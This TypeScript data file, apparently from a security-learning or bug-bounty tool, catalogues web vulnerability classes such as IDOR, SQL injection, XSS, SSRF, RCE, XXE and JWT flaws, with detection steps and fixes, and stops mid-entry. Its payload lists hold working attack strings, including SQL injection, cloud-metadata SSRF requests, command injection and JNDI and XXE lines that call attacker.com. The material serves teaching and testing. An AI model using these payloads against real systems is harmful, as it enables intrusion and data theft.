export interface VulnCategory {
  id: string;
  name: string;
  riskLevel: "Critical" | "High" | "Medium" | "Low";
  definition: string;
  simpleDefinition: string;
  howItWorks: string;
  simpleHowItWorks: string;
  cveExample: { id: string; description: string };
  detectionTechniques: string[];
  payloads: string[];
  tools: string[];
  writeupLinks: { title: string; url: string }[];
  remediation: string[];
  analyzerContext: string;
}

export const VULN_CATEGORIES: VulnCategory[] = [
  {
    id: "idor",
    name: "IDOR",
    riskLevel: "High",
    definition:
      "Insecure Direct Object Reference (IDOR) occurs when an application exposes internal implementation objects—such as database keys, file paths, or user IDs—through URL parameters or request bodies without proper authorization checks.",
    simpleDefinition:
      "The app lets you change an ID number in the URL and see someone else's private data—like changing ?user=123 to ?user=124 and seeing another person's account.",
    howItWorks:
      "An attacker modifies an identifier (numeric ID, UUID, filename) in a request to access resources belonging to other users. The server fails to verify that the requesting user owns or is authorized to view the referenced object.",
    simpleHowItWorks:
      "Imagine numbered mailboxes with no locks. You just open any mailbox by changing the number. That's IDOR—the app trusts you to only open your own box but never checks.",
    cveExample: {
      id: "CVE-2019-12725",
      description:
        "Zeroshell Linux had an IDOR in its web interface that allowed unauthenticated attackers to access arbitrary files on the system by manipulating object references.",
    },
    detectionTechniques: [
      "Swap numeric/UUID IDs in GET/POST/PUT/DELETE requests",
      "Test horizontal privilege escalation (same-role user accessing other user data)",
      "Test vertical privilege escalation (low-privilege accessing admin data)",
      "Fuzz object references with Burp Intruder / Autorize extension",
      "Check API endpoints that accept user-controlled identifiers",
    ],
    payloads: [
      "GET /api/users/1001 → GET /api/users/1002",
      "POST /api/orders/delete { id: 5001 } → { id: 5002 }",
      "GET /documents/download?file_id=abc → file_id=def",
      "PUT /api/profile/update { user_id: 'my-uuid' } → { user_id: 'other-uuid' }",
    ],
    tools: ["Burp Suite + Autorize", "OWASP ZAP", "Postman", "ffuf", "Arjun"],
    writeupLinks: [
      { title: "HackerOne: IDOR to Account Takeover", url: "https://hackerone.com/reports/766826" },
      { title: "Bugcrowd: IDOR in API Endpoint", url: "https://bugcrowd.com/disclosures" },
    ],
    remediation: [
      "Implement server-side authorization checks on every object access",
      "Use indirect references (maps/tokens) instead of direct DB IDs",
      "Validate that the authenticated user owns the requested resource",
      "Log and monitor access patterns for anomalies",
    ],
    analyzerContext:
      "Focus on IDOR vulnerabilities. Look for direct object references in URLs, API endpoints, and request parameters. Check for missing authorization on resource access.",
  },
  {
    id: "sqli",
    name: "SQL Injection",
    riskLevel: "Critical",
    definition:
      "SQL Injection (SQLi) allows attackers to inject malicious SQL statements into application queries through unsanitized user input, potentially reading, modifying, or deleting database contents.",
    simpleDefinition:
      "You type special database commands into a search box or login form and the app accidentally runs them—letting you steal or destroy all the data.",
    howItWorks:
      "When user input is concatenated into SQL queries without parameterization, an attacker can break out of the intended query context and inject arbitrary SQL. This can lead to data exfiltration, authentication bypass, or full database compromise.",
    simpleHowItWorks:
      "Think of it like filling a form where the app blindly pastes your answer into a database command. If you write something tricky, the database does whatever you say.",
    cveExample: {
      id: "CVE-2021-27928",
      description:
        "MariaDB had a severe SQLi vulnerability that allowed remote authenticated users to execute arbitrary code via crafted SET GLOBAL statements.",
    },
    detectionTechniques: [
      "Insert single quotes (') in all input fields and observe errors",
      "Use time-based payloads: ' OR SLEEP(5)--",
      "Boolean-based: ' OR 1=1-- vs ' OR 1=2--",
      "UNION-based enumeration of columns and tables",
      "Test HTTP parameters, headers, cookies, and JSON bodies",
    ],
    payloads: [
      "' OR '1'='1' --",
      "' UNION SELECT username, password FROM users--",
      "1; DROP TABLE users--",
      "' AND (SELECT SLEEP(5))--",
      "admin'--",
      "1' ORDER BY 1,2,3--",
    ],
    tools: ["sqlmap", "Burp Suite", "Havij", "jSQL Injection", "OWASP ZAP"],
    writeupLinks: [
      { title: "HackerOne: Blind SQLi in Search", url: "https://hackerone.com/reports/363815" },
      { title: "PortSwigger: SQL Injection Labs", url: "https://portswigger.net/web-security/sql-injection" },
    ],
    remediation: [
      "Use parameterized queries / prepared statements exclusively",
      "Implement input validation and allowlisting",
      "Apply least-privilege database accounts",
      "Use WAF rules as defense-in-depth",
      "Regularly audit queries with static analysis tools",
    ],
    analyzerContext:
      "Focus on SQL Injection. Check all input vectors (parameters, headers, cookies) for SQL injection. Test for error-based, blind, and UNION-based injection.",
  },
  {
    id: "xss",
    name: "Cross-Site Scripting (XSS)",
    riskLevel: "High",
    definition:
      "Cross-Site Scripting (XSS) enables attackers to inject malicious client-side scripts into web pages viewed by other users, leading to session hijacking, defacement, or credential theft.",
    simpleDefinition:
      "You sneak JavaScript code into a website so when other people visit the page, your code runs in their browser—stealing their cookies or login info.",
    howItWorks:
      "When a web application includes untrusted data in its output without proper validation or encoding, an attacker can inject script tags or event handlers. Three main types: Reflected (URL-based), Stored (persisted in DB), and DOM-based (client-side manipulation).",
    simpleHowItWorks:
      "Imagine writing a message on a bulletin board. Instead of a message, you write a script. Everyone who reads the board unknowingly runs your script in their browser.",
    cveExample: {
      id: "CVE-2020-11022",
      description:
        "jQuery before 3.5.0 had a Stored XSS vulnerability when passing untrusted HTML to jQuery's DOM manipulation methods like .html() or .append().",
    },
    detectionTechniques: [
      "Inject <script>alert(1)</script> in all input fields",
      "Test event handlers: \" onmouseover=\"alert(1)\"",
      "Check for DOM-based XSS via URL fragments and document.location",
      "Test SVG/IMG tags: <img src=x onerror=alert(1)>",
      "Review Content-Security-Policy headers",
    ],
    payloads: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "\"><svg onload=alert(1)>",
      "javascript:alert(document.cookie)",
      "<body onload=alert('XSS')>",
      "'-alert(1)-'",
    ],
    tools: ["Burp Suite", "XSStrike", "Dalfox", "OWASP ZAP", "BruteXSS"],
    writeupLinks: [
      { title: "HackerOne: Stored XSS in Comments", url: "https://hackerone.com/reports/485748" },
      { title: "PortSwigger: XSS Cheat Sheet", url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" },
    ],
    remediation: [
      "Encode output based on context (HTML, JS, URL, CSS)",
      "Implement Content-Security-Policy headers",
      "Use frameworks with automatic escaping (React, Angular)",
      "Validate and sanitize all user input server-side",
      "Use HttpOnly and Secure flags on cookies",
    ],
    analyzerContext:
      "Focus on Cross-Site Scripting (XSS). Test all input reflection points for stored, reflected, and DOM-based XSS. Check CSP headers and encoding.",
  },
  {
    id: "ssrf",
    name: "Server-Side Request Forgery (SSRF)",
    riskLevel: "Critical",
    definition:
      "SSRF allows attackers to induce the server to make HTTP requests to arbitrary destinations, potentially accessing internal services, cloud metadata endpoints, or other back-end systems.",
    simpleDefinition:
      "You trick the server into making web requests for you—letting you reach internal systems and secret data that should be hidden from the outside world.",
    howItWorks:
      "When an application fetches a remote resource based on user-supplied input (URL, hostname) without validation, an attacker can redirect that request to internal networks, cloud metadata APIs (169.254.169.254), or other sensitive endpoints.",
    simpleHowItWorks:
      "It's like asking a librarian to fetch a book from another room. Instead of a book title, you give them directions to the vault where secrets are kept.",
    cveExample: {
      id: "CVE-2019-17558",
      description:
        "Apache Solr SSRF vulnerability allowed attackers to read internal files and reach internal services via the Velocity template engine.",
    },
    detectionTechniques: [
      "Replace URLs with http://127.0.0.1 and internal IPs",
      "Test cloud metadata: http://169.254.169.254/latest/meta-data/",
      "Try DNS rebinding techniques",
      "Fuzz URL parameters with Burp Collaborator",
      "Check for redirect-based SSRF bypasses",
    ],
    payloads: [
      "http://127.0.0.1:80",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://[::1]:80",
      "http://0x7f000001",
      "file:///etc/passwd",
      "gopher://127.0.0.1:25/",
    ],
    tools: ["Burp Collaborator", "SSRFmap", "Gopherus", "ffuf", "OWASP ZAP"],
    writeupLinks: [
      { title: "HackerOne: SSRF to AWS Credentials", url: "https://hackerone.com/reports/508459" },
      { title: "PortSwigger: SSRF Labs", url: "https://portswigger.net/web-security/ssrf" },
    ],
    remediation: [
      "Validate and allowlist URLs/hostnames server-side",
      "Block requests to private IP ranges and metadata endpoints",
      "Use network-level segmentation for internal services",
      "Disable unnecessary URL schemes (file://, gopher://)",
      "Implement egress firewall rules",
    ],
    analyzerContext:
      "Focus on SSRF vulnerabilities. Look for URL input parameters, file fetch features, and webhook endpoints. Test for internal network access and cloud metadata exposure.",
  },
  {
    id: "rce",
    name: "Remote Code Execution (RCE)",
    riskLevel: "Critical",
    definition:
      "Remote Code Execution allows an attacker to execute arbitrary commands or code on a target server, typically resulting in complete system compromise.",
    simpleDefinition:
      "You find a way to run any program or command on the server—like having a remote control for their entire computer.",
    howItWorks:
      "RCE occurs when user-controlled data reaches dangerous functions (eval, exec, system, deserialization) without sanitization. Common vectors include command injection, unsafe deserialization, template injection, and file upload vulnerabilities.",
    simpleHowItWorks:
      "The server has a 'run this command' button that was supposed to be locked. You find a way to press it and type any command you want.",
    cveExample: {
      id: "CVE-2021-44228",
      description:
        "Log4Shell—a critical RCE in Apache Log4j2 that allowed remote attackers to execute arbitrary code via crafted log messages using JNDI lookups.",
    },
    detectionTechniques: [
      "Inject OS commands: ; id, | whoami, `sleep 5`",
      "Test file uploads for executable content (.php, .jsp, .py)",
      "Check for template injection: {{7*7}}, ${7*7}",
      "Test deserialization endpoints with ysoserial payloads",
      "Look for eval/exec patterns in application logic",
    ],
    payloads: [
      "; id",
      "| cat /etc/passwd",
      "$(whoami)",
      "`sleep 10`",
      "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
      "${jndi:ldap://attacker.com/exploit}",
    ],
    tools: ["Burp Suite", "Commix", "ysoserial", "tplmap", "Metasploit"],
    writeupLinks: [
      { title: "HackerOne: RCE via File Upload", url: "https://hackerone.com/reports/914987" },
      { title: "PortSwigger: OS Command Injection", url: "https://portswigger.net/web-security/os-command-injection" },
    ],
    remediation: [
      "Never pass user input to system commands or eval()",
      "Use parameterized APIs instead of shell execution",
      "Validate file uploads (type, extension, content)",
      "Implement sandboxing and least-privilege processes",
      "Keep dependencies updated to avoid known RCE CVEs",
    ],
    analyzerContext:
      "Focus on Remote Code Execution. Test for command injection, unsafe deserialization, template injection, and dangerous file upload handling.",
  },
  {
    id: "lfi",
    name: "Local File Inclusion (LFI)",
    riskLevel: "High",
    definition:
      "Local File Inclusion allows an attacker to include files from the server's local filesystem through manipulated file path parameters, potentially exposing sensitive configuration or code.",
    simpleDefinition:
      "You change a filename in the URL to read secret files from the server—like /etc/passwd or config files with database passwords.",
    howItWorks:
      "When an application dynamically includes files based on user input (e.g., ?page=about.php) without proper path validation, an attacker can traverse directories (../) to read arbitrary files on the filesystem.",
    simpleHowItWorks:
      "The app loads pages by filename. Instead of asking for 'about.html', you ask for '../../../../etc/passwd' and the server shows you the system's password file.",
    cveExample: {
      id: "CVE-2021-41773",
      description:
        "Apache HTTP Server 2.4.49 path traversal flaw allowed attackers to read arbitrary files and potentially achieve RCE via LFI.",
    },
    detectionTechniques: [
      "Test path traversal: ../../etc/passwd",
      "Try null byte injection: ../../../etc/passwd%00",
      "Test wrapper protocols: php://filter/convert.base64-encode/resource=index.php",
      "Fuzz file parameters with directory traversal wordlists",
      "Check for log file poisoning for RCE escalation",
    ],
    payloads: [
      "../../../../etc/passwd",
      "....//....//....//etc/passwd",
      "php://filter/convert.base64-encode/resource=config.php",
      "/proc/self/environ",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "%252e%252e%252f%252e%252e%252fetc/passwd",
    ],
    tools: ["Burp Suite", "ffuf", "dotdotpwn", "LFISuite", "Kadimus"],
    writeupLinks: [
      { title: "HackerOne: LFI to Source Code Disclosure", url: "https://hackerone.com/reports/538771" },
      { title: "PortSwigger: File Path Traversal", url: "https://portswigger.net/web-security/file-path-traversal" },
    ],
    remediation: [
      "Use allowlisted file references instead of user-controlled paths",
      "Canonicalize paths and validate against a base directory",
      "Disable unnecessary PHP wrappers (php://, data://)",
      "Run web server with minimal filesystem permissions",
      "Use chroot or containerization to limit file access",
    ],
    analyzerContext:
      "Focus on Local File Inclusion. Check file parameters for path traversal, PHP wrappers, and directory traversal bypasses.",
  },
  {
    id: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    riskLevel: "Medium",
    definition:
      "CSRF tricks an authenticated user's browser into making unwanted requests to a web application, performing actions like changing passwords, transferring funds, or modifying settings without the user's consent.",
    simpleDefinition:
      "A malicious website makes your browser secretly send requests to another site where you're logged in—doing things on your behalf without you knowing.",
    howItWorks:
      "The attacker crafts a malicious page with auto-submitting forms or image tags pointing to the target application. When a logged-in victim visits the malicious page, their browser sends the forged request with valid session cookies.",
    simpleHowItWorks:
      "You're logged into your bank. You visit a bad website. That website secretly tells your browser to send 'transfer $1000' to your bank—and your browser obeys because you're already logged in.",
    cveExample: {
      id: "CVE-2019-1003029",
      description:
        "Jenkins Script Security Plugin had a CSRF vulnerability that allowed attackers to execute arbitrary Groovy scripts by tricking admin users.",
    },
    detectionTechniques: [
      "Check for missing CSRF tokens in state-changing forms",
      "Test if removing/modifying CSRF token still works",
      "Verify SameSite cookie attributes",
      "Test cross-origin POST requests without tokens",
      "Check Referer/Origin header validation",
    ],
    payloads: [
      "<form action='https://target.com/change-email' method='POST'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script>",
      "<img src='https://target.com/api/delete-account?confirm=true'>",
    ],
    tools: ["Burp Suite", "OWASP ZAP", "XSRFProbe", "CSRFTester"],
    writeupLinks: [
      { title: "HackerOne: CSRF to Account Takeover", url: "https://hackerone.com/reports/737140" },
      { title: "PortSwigger: CSRF Labs", url: "https://portswigger.net/web-security/csrf" },
    ],
    remediation: [
      "Implement anti-CSRF tokens (synchronizer token pattern)",
      "Set SameSite=Strict or Lax on session cookies",
      "Validate Origin and Referer headers",
      "Require re-authentication for sensitive actions",
      "Use custom request headers that CORS preflight blocks",
    ],
    analyzerContext:
      "Focus on CSRF vulnerabilities. Check for missing CSRF tokens, SameSite cookie flags, and unprotected state-changing endpoints.",
  },
  {
    id: "jwt",
    name: "JWT Vulnerabilities",
    riskLevel: "High",
    definition:
      "JWT (JSON Web Token) vulnerabilities arise from insecure token generation, validation, or storage—allowing attackers to forge tokens, bypass authentication, or escalate privileges.",
    simpleDefinition:
      "The app uses digital 'tickets' (JWTs) for login. If the ticket system is broken, you can forge your own tickets and pretend to be anyone—even an admin.",
    howItWorks:
      "Common JWT attacks include: algorithm confusion (changing RS256 to HS256 using the public key as the HMAC secret), 'none' algorithm bypass, weak signing secrets, missing expiration validation, and JWK header injection.",
    simpleHowItWorks:
      "JWTs are like signed permission slips. If the app doesn't check signatures properly, you can write your own permission slip saying 'I'm the admin' and the app believes you.",
    cveExample: {
      id: "CVE-2022-21449",
      description:
        "Java's ECDSA signature verification was flawed ('Psychic Signatures')—blank signatures were accepted as valid, allowing JWT forgery.",
    },
    detectionTechniques: [
      "Test 'none' algorithm: change alg to 'none' and remove signature",
      "Try algorithm confusion: RS256 → HS256 with public key",
      "Brute-force weak HMAC secrets with jwt_tool",
      "Check for missing exp/nbf validation",
      "Test JWK/JKU header injection",
    ],
    payloads: [
      '{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.  (empty signature)',
      '{"alg":"HS256"} signed with RS256 public key',
      'Modify "role":"user" → "role":"admin" in payload',
      'Set "exp" to far future timestamp',
    ],
    tools: ["jwt_tool", "jwt.io", "Burp Suite JWT Editor", "John the Ripper", "hashcat"],
    writeupLinks: [
      { title: "HackerOne: JWT None Algorithm Bypass", url: "https://hackerone.com/reports/638635" },
      { title: "PortSwigger: JWT Attacks", url: "https://portswigger.net/web-security/jwt" },
    ],
    remediation: [
      "Always validate the alg header against an allowlist",
      "Use strong, unique secrets for HMAC signing",
      "Enforce token expiration (exp) and not-before (nbf)",
      "Invalidate tokens on password change/logout",
      "Store tokens securely (HttpOnly cookies, not localStorage)",
    ],
    analyzerContext:
      "Focus on JWT vulnerabilities. Analyze token structure, algorithm usage, signature validation, and claim verification.",
  },
  {
    id: "graphql",
    name: "GraphQL Vulnerabilities",
    riskLevel: "Medium",
    definition:
      "GraphQL APIs can be vulnerable to introspection leaks, query complexity attacks (DoS), authorization bypasses, injection, and batching attacks due to their flexible query language.",
    simpleDefinition:
      "GraphQL is a flexible way to ask a server for data. Because it's so flexible, attackers can ask for way too much data, crash the server, or access things they shouldn't.",
    howItWorks:
      "GraphQL's flexibility allows attackers to send deeply nested queries (resource exhaustion), use introspection to map the entire API schema, bypass per-field authorization, batch many operations in one request, or inject into query arguments.",
    simpleHowItWorks:
      "GraphQL lets you pick exactly what data you want. Attackers abuse this to ask for everything at once, dig into hidden data, or send thousands of requests disguised as one.",
    cveExample: {
      id: "CVE-2021-41248",
      description:
        "GraphQL Playground had an XSS vulnerability that allowed attackers to execute arbitrary JavaScript through crafted GraphQL responses.",
    },
    detectionTechniques: [
      "Send introspection query: { __schema { types { name } } }",
      "Test deeply nested queries for DoS",
      "Check for query batching: [{query1},{query2},...]",
      "Test field-level authorization (request fields of other users)",
      "Look for mutation abuse and rate limiting gaps",
    ],
    payloads: [
      '{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }',
      'query { user(id: "other-user-id") { email password_hash } }',
      '[{"query":"{ me { id } }"},{"query":"{ me { id } }"},...] (batching)',
      'query { a: users { id } b: users { id } ... } (aliasing)',
    ],
    tools: ["GraphQL Voyager", "InQL (Burp)", "Altair GraphQL Client", "graphql-cop", "CrackQL"],
    writeupLinks: [
      { title: "HackerOne: GraphQL Introspection Leak", url: "https://hackerone.com/reports/291531" },
      { title: "GraphQL Security Best Practices", url: "https://the-guild.dev/graphql/security" },
    ],
    remediation: [
      "Disable introspection in production",
      "Implement query depth and complexity limits",
      "Add per-field authorization checks",
      "Rate-limit and throttle queries",
      "Validate and sanitize all query arguments",
    ],
    analyzerContext:
      "Focus on GraphQL security. Test for introspection leaks, query complexity DoS, authorization bypasses, and batching attacks.",
  },
  {
    id: "business-logic",
    name: "Business Logic Flaws",
    riskLevel: "High",
    definition:
      "Business logic flaws are vulnerabilities in the application's workflow and rules—not code bugs—that allow attackers to abuse legitimate functionality for unintended outcomes like free purchases, privilege escalation, or data manipulation.",
    simpleDefinition:
      "The app's rules have holes. Like a coupon that can be used infinite times, or skipping payment but still getting the product.",
    howItWorks:
      "These flaws exploit assumptions in the application's workflow. Examples: manipulating pricing (negative quantities), bypassing multi-step processes, abusing referral systems, exploiting race conditions in financial transactions, or circumventing rate limits.",
    simpleHowItWorks:
      "The app assumes you'll follow the rules. But what if you add -1 items to your cart? Or skip step 2 of checkout? Or use a discount code 100 times? Those are business logic flaws.",
    cveExample: {
      id: "N/A",
      description:
        "A major e-commerce platform allowed users to apply expired coupons by replaying old API requests, resulting in millions in losses—a classic business logic flaw.",
    },
    detectionTechniques: [
      "Test with negative values, zero quantities, boundary values",
      "Skip steps in multi-step workflows",
      "Replay and reorder API requests",
      "Test coupon/discount stacking and reuse",
      "Check for price manipulation in client-side calculations",
    ],
    payloads: [
      'quantity: -1 (negative purchase)',
      'price: 0.01 (price tampering)',
      'Skip step 2 → directly POST to step 3 endpoint',
      'Apply coupon → remove item → re-add item (coupon persists)',
      'Transfer $0.001 × 1000000 (rounding exploitation)',
    ],
    tools: ["Burp Suite", "Postman", "Custom scripts", "Burp Repeater", "Browser DevTools"],
    writeupLinks: [
      { title: "HackerOne: Business Logic Bypass", url: "https://hackerone.com/reports/429060" },
      { title: "PortSwigger: Business Logic Labs", url: "https://portswigger.net/web-security/logic-flaws" },
    ],
    remediation: [
      "Validate all business rules server-side, never trust client input",
      "Enforce sequential workflow steps with server-side state tracking",
      "Implement rate limiting on sensitive operations",
      "Add integrity checks on pricing and quantities",
      "Conduct thorough threat modeling of business workflows",
    ],
    analyzerContext:
      "Focus on business logic flaws. Look for workflow bypasses, price manipulation, multi-step process skipping, and abuse of legitimate features.",
  },
  {
    id: "race-conditions",
    name: "Race Conditions",
    riskLevel: "High",
    definition:
      "Race condition vulnerabilities occur when an application's behavior depends on the timing of concurrent operations, allowing attackers to exploit time-of-check-to-time-of-use (TOCTOU) gaps.",
    simpleDefinition:
      "You send the same request super fast before the server can process the first one—like using a gift card twice before the balance updates.",
    howItWorks:
      "By sending multiple identical requests simultaneously (e.g., fund transfers, coupon redemptions, vote submissions), an attacker can exploit the window between checking a condition and updating state. This can result in double-spending, duplicate actions, or bypassing limits.",
    simpleHowItWorks:
      "Imagine two people trying to withdraw the last $100 from an ATM at the exact same time. Both see $100 available, both withdraw, and the bank loses $100.",
    cveExample: {
      id: "CVE-2023-32784",
      description:
        "KeePass had a race condition that allowed extraction of the master password from process memory during password entry.",
    },
    detectionTechniques: [
      "Send concurrent requests using Burp Turbo Intruder",
      "Test single-use tokens/coupons with parallel requests",
      "Check fund transfer endpoints for double-spending",
      "Test vote/like endpoints for duplicate counting",
      "Use HTTP/2 single-packet attack for precise timing",
    ],
    payloads: [
      "Send 20 concurrent POST /redeem-coupon requests",
      "Parallel POST /transfer { amount: full_balance } requests",
      "Simultaneous POST /vote × 50",
      "Race file upload + file process endpoints",
    ],
    tools: ["Burp Turbo Intruder", "race-the-web", "Go scripts with goroutines", "Python asyncio/threading", "Apache Bench (ab)"],
    writeupLinks: [
      { title: "HackerOne: Race Condition Double Spend", url: "https://hackerone.com/reports/759247" },
      { title: "PortSwigger: Race Conditions", url: "https://portswigger.net/web-security/race-conditions" },
    ],
    remediation: [
      "Use database-level locking (SELECT FOR UPDATE)",
      "Implement idempotency keys for critical operations",
      "Use atomic operations and transactions",
      "Add mutex/semaphore locks on shared resources",
      "Validate state immediately before modification",
    ],
    analyzerContext:
      "Focus on race condition vulnerabilities. Test for TOCTOU gaps, double-spending, and concurrent request abuse on state-changing endpoints.",
  },
  {
    id: "auth-bypass",
    name: "Authentication Bypass",
    riskLevel: "Critical",
    definition:
      "Authentication bypass vulnerabilities allow attackers to access protected resources or functionality without providing valid credentials, effectively circumventing the login mechanism.",
    simpleDefinition:
      "You find a way to get into the app without logging in—like finding a back door that skips the password check entirely.",
    howItWorks:
      "Common vectors include: default credentials, forced browsing to admin pages, manipulating authentication tokens, exploiting password reset flaws, abusing 'remember me' functionality, or exploiting SSO/OAuth implementation flaws.",
    simpleHowItWorks:
      "The front door has a lock (login page), but you can walk around to the side door (direct URL), pick the lock (weak token), or use the master key (default password).",
    cveExample: {
      id: "CVE-2023-46747",
      description:
        "F5 BIG-IP had a critical authentication bypass via AJP request smuggling that allowed unauthenticated attackers to gain admin access.",
    },
    detectionTechniques: [
      "Test direct URL access to admin/protected pages",
      "Try default credentials (admin:admin, admin:password)",
      "Manipulate session tokens and cookies",
      "Test password reset token predictability",
      "Check OAuth callback validation and state parameter",
    ],
    payloads: [
      "Direct access: /admin, /dashboard, /api/admin/*",
      "Header injection: X-Original-URL: /admin",
      "Method override: X-HTTP-Method-Override: PUT",
      "Cookie manipulation: isAdmin=true",
      "OAuth redirect manipulation: redirect_uri=attacker.com",
    ],
    tools: ["Burp Suite", "ffuf", "Hydra", "Patator", "OAuth testing tools"],
    writeupLinks: [
      { title: "HackerOne: Auth Bypass via Token Manipulation", url: "https://hackerone.com/reports/745324" },
      { title: "PortSwigger: Authentication Labs", url: "https://portswigger.net/web-security/authentication" },
    ],
    remediation: [
      "Enforce authentication checks server-side on all protected routes",
      "Remove or change all default credentials",
      "Implement secure session management with proper token entropy",
      "Use MFA for sensitive operations",
      "Validate OAuth/OIDC flows thoroughly including state and redirect_uri",
    ],
    analyzerContext:
      "Focus on authentication bypass. Test for forced browsing, default credentials, token manipulation, password reset flaws, and OAuth/SSO misconfigurations.",
  },
  {
    id: "cors",
    name: "CORS Misconfiguration",
    riskLevel: "Medium",
    definition:
      "Cross-Origin Resource Sharing (CORS) misconfigurations allow malicious websites to make authenticated cross-origin requests and read responses, bypassing the Same-Origin Policy.",
    simpleDefinition:
      "The server accidentally tells browsers 'any website can read my data.' So a malicious site can steal your private data from that server while you're logged in.",
    howItWorks:
      "When a server reflects the Origin header in Access-Control-Allow-Origin without validation, or uses wildcard (*) with credentials, malicious sites can read authenticated API responses. This enables data theft from any user who visits the attacker's page.",
    simpleHowItWorks:
      "Normally, website A can't read data from website B. CORS misconfiguration is like website B saying 'sure, everyone can read my data'—including malicious websites.",
    cveExample: {
      id: "CVE-2019-3806",
      description:
        "GitLab had a CORS misconfiguration that allowed any website to make authenticated API requests and read private repository data.",
    },
    detectionTechniques: [
      "Send requests with Origin: https://evil.com and check ACAO header",
      "Test null origin: Origin: null",
      "Check if credentials are allowed with reflected origins",
      "Test subdomain-based bypasses: evil-target.com",
      "Verify preflight request handling",
    ],
    payloads: [
      "Origin: https://evil.com → check Access-Control-Allow-Origin",
      "Origin: null → check if null is reflected",
      "Origin: https://target.com.evil.com",
      "Origin: https://evil-target.com",
    ],
    tools: ["Burp Suite", "CORScanner", "curl", "OWASP ZAP"],
    writeupLinks: [
      { title: "HackerOne: CORS to Data Theft", url: "https://hackerone.com/reports/426147" },
      { title: "PortSwigger: CORS Labs", url: "https://portswigger.net/web-security/cors" },
    ],
    remediation: [
      "Validate Origin against a strict allowlist",
      "Never reflect arbitrary Origin values",
      "Avoid Access-Control-Allow-Origin: * with credentials",
      "Implement proper preflight response caching",
      "Use SameSite cookies as additional protection",
    ],
    analyzerContext:
      "Focus on CORS misconfiguration. Test origin reflection, null origin handling, credential allowance, and subdomain bypass patterns.",
  },
  {
    id: "xxe",
    name: "XML External Entity (XXE)",
    riskLevel: "High",
    definition:
      "XXE attacks exploit XML parsers that process external entity declarations, allowing attackers to read local files, perform SSRF, or cause denial of service.",
    simpleDefinition:
      "You send the app a specially crafted XML file that tricks it into reading secret files from the server and sending them back to you.",
    howItWorks:
      "XML allows defining external entities that reference local files or remote URLs. When an XML parser processes untrusted XML with external entity processing enabled, an attacker can define entities that read /etc/passwd, access internal services, or cause a Billion Laughs DoS.",
    simpleHowItWorks:
      "XML has a feature that says 'include this file's contents here.' Attackers abuse it to say 'include the server's password file here' and the server obeys.",
    cveExample: {
      id: "CVE-2021-21237",
      description:
        "Git LFS had a blind XXE vulnerability that allowed attackers to exfiltrate data from CI/CD servers processing specially crafted Git LFS configuration.",
    },
    detectionTechniques: [
      "Inject XXE payload in XML/SOAP/SVG upload fields",
      "Test file retrieval: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
      "Try blind XXE with out-of-band (OOB) exfiltration",
      "Check for error-based XXE information disclosure",
      "Test SVG/DOCX/XLSX uploads for XXE",
    ],
    payloads: [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<!ENTITY xxe SYSTEM "http://attacker.com/steal?data=">',
      '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
      'Billion Laughs: <!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;...">',
    ],
    tools: ["Burp Suite", "XXEinjector", "oxml_xxe", "OWASP ZAP"],
    writeupLinks: [
      { title: "HackerOne: XXE in File Upload", url: "https://hackerone.com/reports/334488" },
      { title: "PortSwigger: XXE Labs", url: "https://portswigger.net/web-security/xxe" },
    ],
    remediation: [
      "Disable external entity processing in XML parsers",
      "Use JSON instead of XML where possible",
      "Validate and sanitize XML input",
      "Use less complex data formats (YAML, JSON)",
      "Keep XML parser libraries updated",
    ],
    analyzerContext:
      "Focus on XXE vulnerabilities. Test XML input points, file upload endpoints, and SOAP services for external entity injection.",
  },
  {
    id: "open-redirect",
    name: "Open Redirect",
    riskLevel: "Low",
    definition:
      "Open redirect vulnerabilities occur when an application redirects users to a URL specified in user-controlled input without proper validation, enabling phishing and credential theft.",
    simpleDefinition:
      "The app has a 'redirect to this link' feature. Attackers abuse it to redirect you to a fake login page that looks real—and steal your password.",
    howItWorks:
      "Applications often use URL parameters like ?redirect=, ?next=, or ?url= for post-login redirection. Without validation, attackers can set these to malicious URLs, using the trusted domain as a launchpad for phishing.",
    simpleHowItWorks:
      "It's like a trusted friend saying 'follow this link, it's safe.' But someone changed the link to a phishing page. You trust the friend, so you click—and get phished.",
    cveExample: {
      id: "CVE-2020-26234",
      description:
        "opencast (video management platform) had an open redirect vulnerability in its authentication redirect parameter.",
    },
    detectionTechniques: [
      "Test redirect parameters: ?redirect=https://evil.com",
      "Try bypass techniques: //evil.com, /\\evil.com",
      "Test URL encoding: %2F%2Fevil.com",
      "Check for protocol-relative redirects",
      "Test after login/logout redirect flows",
    ],
    payloads: [
      "?redirect=https://evil.com",
      "?next=//evil.com",
      "?url=/\\evil.com",
      "?redirect=https://target.com@evil.com",
      "?next=javascript:alert(1)",
      "?redirect=https%3A%2F%2Fevil.com",
    ],
    tools: ["Burp Suite", "OpenRedireX", "Oralyzer", "ParamSpider"],
    writeupLinks: [
      { title: "HackerOne: Open Redirect to Phishing", url: "https://hackerone.com/reports/405100" },
      { title: "PortSwigger: Open Redirect", url: "https://portswigger.net/kb/issues/00500100_open-redirection-reflected" },
    ],
    remediation: [
      "Validate redirect URLs against an allowlist of domains",
      "Use relative paths only for redirects",
      "Never allow user-controlled full URLs in redirects",
      "Implement a redirect confirmation page for external links",
      "Strip or reject URLs with different schemes or domains",
    ],
    analyzerContext:
      "Focus on open redirect vulnerabilities. Test redirect parameters, login flows, and URL validation for redirect bypass techniques.",
  },
  {
    id: "clickjacking",
    name: "Clickjacking",
    riskLevel: "Medium",
    definition:
      "Clickjacking (UI Redressing) tricks users into clicking hidden elements by overlaying transparent iframes on top of legitimate-looking content, performing unintended actions.",
    simpleDefinition:
      "A malicious page puts an invisible button over something you want to click. You think you're clicking 'Play Video' but you're actually clicking 'Delete Account.'",
    howItWorks:
